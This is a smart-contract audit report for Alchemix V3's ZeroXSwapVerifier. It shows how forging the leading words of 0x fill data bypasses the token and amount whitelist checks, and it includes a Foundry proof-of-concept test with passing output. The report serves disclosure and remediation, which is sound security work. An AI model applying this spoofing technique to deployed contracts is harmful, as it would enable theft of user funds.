# 58709 sc low naive 0x fill parsing lets attackers spoof token and amount checks

**Submitted on Nov 4th 2025 at 07:45:59 UTC by @konvati for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58709
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Finding Description and Impact

`ZeroXSwapVerifier` trusts the first 32–64 bytes of opaque 0x fill payloads when validating swap tokens and amounts. For `UNISWAPV3_VIP`, `_extractTokenFromUniswapFills(fills)` simply decodes the first word as an address, and for `RFQ_VIP`, `_extractTokenAndAmountFromRFQ(fillData)` decodes the first two words as `(address, uint256)` ([`src/utils/ZeroXSwapVerifier.sol:214-244`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L214-L244)). In the actual 0x Settler ABI, these blobs are complex encodings whose leading words are not guaranteed to be the sell token or amount; the structure is entirely user-controlled.

Because the verifier compares the decoded address against the target token and assumes the decoded amount matches the quoted sell size, an attacker can forge the first words of the fill data to match the expectations while hiding the real parameters deeper in the blob. The naive parser never inspects those deeper values, so `_verifyUniswapV3VIP` and `_verifyRFQVIP` accept malicious swaps that trade unapproved tokens or arbitrary amounts.

Integrations that rely on `verifySwapCalldata` as a preflight safety check (for example, before approving and forwarding calldata to the 0x Settler) lose their token whitelist guarantees. An attacker can submit a malicious quote that passes verification yet executes with a completely different sell token or amount once routed through 0x.

### Affected code

* [`src/utils/ZeroXSwapVerifier.sol:214-228`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L214-L228)
* [`src/utils/ZeroXSwapVerifier.sol:229-244`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L229-L244)
* [`src/utils/ZeroXSwapVerifier.sol:274-292`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L274-L292)

```solidity
// src/utils/ZeroXSwapVerifier.sol#L274-L292
function _extractTokenFromUniswapFills(bytes memory fills) internal pure returns (address) {
    if (fills.length >= 32) {
        return abi.decode(_slice(fills, 0, 32), (address));
    }
    revert("unimplemented");
}

function _extractTokenAndAmountFromRFQ(bytes memory fillData) internal pure returns (address token, uint256 amount) {
    if (fillData.length >= 64) {
        return abi.decode(_slice(fillData, 0, 64), (address, uint256));
    }
    revert("unimplemented");
}
```

***

## Impact

### Token whitelist bypass for UniswapV3 VIP swaps

* `_verifyUniswapV3VIP` compares the decoded sell token against `targetToken`.
* By placing the expected token address in the first word of `fills`, the attacker satisfies this check even if the rest of the blob drives 0x to sell a different asset.
* The orchestrator forwards the payload, and 0x executes the swap with the malicious token, violating whitelist assumptions.

### Arbitrary sell amounts in RFQ VIP swaps

* `_verifyRFQVIP` trusts the first two words of `fillData` as `(sellToken, sellAmount)`.
* The attacker sets benign values in those slots, while the actual RFQ order embedded later spends any token/amount the attacker controls.
* Limit or slippage protections outside the verifier provide no defense because the forged header data is never used by 0x.

***

## Recommended mitigation steps

1. Replace the naive `_extractTokenFromUniswapFills` and `_extractTokenAndAmountFromRFQ` helpers with full decoders for the 0x Settler fill formats (or query the official 0x libraries) so the verifier inspects the authentic token and amount fields.
2. Alternatively, require the orchestrator to supply the expected sell token and amount per action, and enforce equality directly without re-parsing the opaque blob.
3. Add regression tests that attempt to spoof the header words to ensure the verifier now rejects mismatched payloads.

***

## Proof of Concept

## PoC Test `testSpoofedUniswapV3FillBypassesTokenCheck` That will Run in (`src/test/Poc.t.sol`)

### Exploit Sequence 1

1. Craft UniswapV3 VIP `fills` bytes where the first word is the allow-listed token but the second word encodes the real malicious token.
2. Build the `execute()` payload using this action and ask the verifier to match the allow-listed token.
3. The verifier decodes only the first word, sees the expected token, and returns `true`, despite the embedded payload swapping a different token.

### Exploit Sequence 2

1. Encode RFQ `fillData` where the first two words mimic the expected `(token, amount)` but place the real `(token, amount)` deeper in the blob.
2. Submit this payload to the verifier with the intended target token.
3. `_extractTokenAndAmountFromRFQ` decodes the forged header, so verification succeeds while 0x would execute using the hidden parameters.

Test file

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

contract ZeroXSwapVerifierSpoofPoC is Test {
    TestERC20 internal allowedSellToken;
    TestERC20 internal maliciousSellToken;
    address internal constant OWNER = address(0xBEEF);

    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f;
    bytes4 private constant UNISWAPV3_VIP = 0x9ebf8e8d;
    bytes4 private constant RFQ_VIP = 0x0dfeb419;

    function setUp() public {
        allowedSellToken = new TestERC20(1_000e18, 18);
        maliciousSellToken = new TestERC20(1_000e18, 18);
    }

    function testSpoofedUniswapV3FillBypassesTokenCheck() public {
        // --- Phase 1: Prepare a spoofed fills blob whose first word mimics the allow-listed token
        bytes memory spoofedFills = abi.encode(address(allowedSellToken), address(maliciousSellToken));
        address naiveSellToken = abi.decode(spoofedFills, (address));
        // The true token the Settler would act on lives in the second word that the verifier never inspects
        ( , address actualSellToken) = abi.decode(spoofedFills, (address, address));
        console.log("Uniswap naive token seen by verifier:", naiveSellToken);
        console.log("Uniswap token actually embedded deeper:", actualSellToken);

        // --- Phase 2: Assemble the 0x execute() calldata with the spoofed action
        bytes memory spoofedCalldata = _buildSingleActionExecuteCalldata(
            _buildUniswapVIPAction(spoofedFills),
            address(allowedSellToken)
        );

        // --- Phase 3: Run the verifier that should pass because the first word matches the target token
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            spoofedCalldata,
            OWNER,
            address(allowedSellToken),
            10_000
        );
        console.log("Verifier result for spoofed UniswapV3 fill:", verified);

        // --- Phase 4: Assert we bypass verification even though the actual fill targets an unapproved token
        assertTrue(verified, "Verifier should accept spoofed fills due to naive decoding");
        assertEq(naiveSellToken, address(allowedSellToken), "First word spoof matches allow-listed token");
        assertEq(actualSellToken, address(maliciousSellToken), "Deeper word reveals the real token being swapped");
        assertTrue(actualSellToken != naiveSellToken, "The spoof only works when tokens differ");
    }

    function testSpoofedRFQFillBypassesTokenAndAmountChecks() public {
        // --- Phase 1: Craft RFQ fill data with fake header token/amount and real values placed later
        bytes memory spoofedFillData = abi.encode(
            address(allowedSellToken),
            uint256(5 ether),
            address(maliciousSellToken),
            uint256(42 ether)
        );
        (address naiveSellToken, uint256 naiveAmount) = abi.decode(spoofedFillData, (address, uint256));
        (, , address actualSellToken, uint256 actualAmount) =
            abi.decode(spoofedFillData, (address, uint256, address, uint256));
        console.log("RFQ naive sell token:", naiveSellToken);
        console.log("RFQ naive amount:", naiveAmount);
        console.log("RFQ actual sell token deeper in blob:", actualSellToken);
        console.log("RFQ actual amount deeper in blob:", actualAmount);

        // --- Phase 2: Make the RFQ action using the spoofed payload
        bytes memory spoofedCalldata = _buildSingleActionExecuteCalldata(
            _buildRFQVIPAction(spoofedFillData),
            address(allowedSellToken)
        );

        // --- Phase 3: Fire the verifier, expecting it to trust the forged header information
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            spoofedCalldata,
            OWNER,
            address(allowedSellToken),
            10_000
        );
        console.log("Verifier result for spoofed RFQ fill:", verified);

        // --- Phase 4: Confirm the verifier is blind to the malicious swap target and amount
        assertTrue(verified, "Verifier should accept spoofed RFQ fill that only forges header words");
        assertEq(naiveSellToken, address(allowedSellToken), "Naive header uses allow-listed token");
        assertEq(actualSellToken, address(maliciousSellToken), "Deep payload swaps unapproved token");
        assertEq(naiveAmount, 5 ether, "Forged header amount looks harmless");
        assertEq(actualAmount, 42 ether, "Hidden amount shows attacker-controlled swap size");
    }

    function _buildUniswapVIPAction(bytes memory spoofedFills) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            UNISWAPV3_VIP,
            address(0xDEAD),
            uint256(100),
            uint256(3_000),
            false,
            spoofedFills
        );
    }

    function _buildRFQVIPAction(bytes memory spoofedFillData) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            RFQ_VIP,
            uint256(0),
            spoofedFillData
        );
    }

    function _buildSingleActionExecuteCalldata(bytes memory action, address buyToken) internal pure returns (bytes memory) {
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: address(0xDEAD),
            buyToken: buyToken,
            minAmountOut: 0,
            actions: _wrapAction(action)
        });
        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
    }

    function _wrapAction(bytes memory action) internal pure returns (bytes[] memory actions) {
        actions = new bytes[](1);
        actions[0] = action;
    }
}

```

Command:

```bash
forge test --mt Spoofed -vv
```

Results

```bash
Ran 2 tests for src/test/Poc.t.sol:ZeroXSwapVerifierSpoofPoC
[PASS] testSpoofedRFQFillBypassesTokenAndAmountChecks() (gas: 131700)
Logs:
  RFQ naive sell token: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  RFQ naive amount: 5000000000000000000
  RFQ actual sell token deeper in blob: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  RFQ actual amount deeper in blob: 42000000000000000000
  Verifier result for spoofed RFQ fill: true

[PASS] testSpoofedUniswapV3FillBypassesTokenCheck() (gas: 129002)
Logs:
  Uniswap naive token seen by verifier: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Uniswap token actually embedded deeper: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  Verifier result for spoofed UniswapV3 fill: true

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.45ms (2.30ms CPU time)
```

The Forge test logs the spoof and shows the verifier accepting it
